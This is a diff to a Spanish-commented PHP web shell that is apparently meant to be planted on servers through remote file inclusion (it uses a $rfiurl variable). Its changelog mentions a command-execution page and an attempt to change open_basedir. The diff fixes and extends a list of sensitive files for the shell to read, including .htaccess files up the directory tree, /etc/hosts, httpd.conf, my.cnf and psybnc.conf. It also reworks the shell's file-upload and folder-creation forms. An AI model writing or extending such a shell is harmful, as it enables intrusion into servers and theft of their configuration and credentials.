@@ -43,10 +43,9 @@
     [!] Cambió el orden de los error_reporting para que sea mas facil debuggear
     [!] Intenta modificar memory_limit
     [!] Al listar archivos los va mostrando de a uno, para no llegar al limite de memoria (funciona bien con los 8mb default)
-    [!] Intenta modificar open_basedir para que sea "/", funciona en PHP >= 5.2.3
     [!] Las lineas del textarea de w=shell se acomodan a las lineas de la salida del comando
     [!] Arreglado un bug en archivosdeusuarios(), que hacia que devuelva solo una ubicacion
-    [+] Agregado <whereis ruby a w=info
+    [+] Agregado "<whereis ruby" y corregido .htacces por .htaccess en w=info
     
    ToDo:
    [!] Eliminar los mensajes de: "No se puede leer /var/log/messages porque supera los 50000 bytes", o ponerlos como link
@@ -678,7 +677,9 @@ $comandos =
 /etc/apt/sources.list
 /etc/hosts
 ./.htaccess
-../.htacces
+../.htaccess
+../../.htaccess
+../../../.htaccess
 '.archivosdeusuarios("/public_html/.htaccess").'
 /opt/lampp/etc/httpd.conf
 /opt/lampp/etc/my.cnf
@@ -825,7 +826,7 @@ psybnc.conf
             unset($archivos[0]);
             
             //las tres primeras filas
-            $directorios = '<tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=subir" method="post" enctype="multipart/form-data">
+            echo '<tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=subir" method="post" enctype="multipart/form-data">
             <td style="text-align:left;font-size:0px;" colspan="3"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
             <input name="ruta2" type="file" style="width:100%;"></td> <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
             <tr><td class="ac"><img src="?w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td><form action="'.$rfiurl.'w=editar" method="POST">
@@ -833,8 +834,7 @@ psybnc.conf
             <td><input type="submit" value="Crear archivo" style="width:100%"></td></form></tr>
             <tr><td class="ac"><img src="?w=img&imagen=carpetanueva" class="ai" alt="Carpeta nuevo"></td><form action="'.$rfiurl.'w=nuevacarpeta" method="POST">
             <td style="text-align:left;font-size:0px;" colspan="3"><input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/"><input name="ruta2" style="width:100%;" value="carpeta"></td>
-            <td><input type="submit" value="Crear carpeta" style="width:100%"></td></form></tr>
-            ';
+            <td><input type="submit" value="Crear carpeta" style="width:100%"></td></form></tr>';
             
             //mostramos el link a todos los archivos
             foreach($archivos as $archivo){
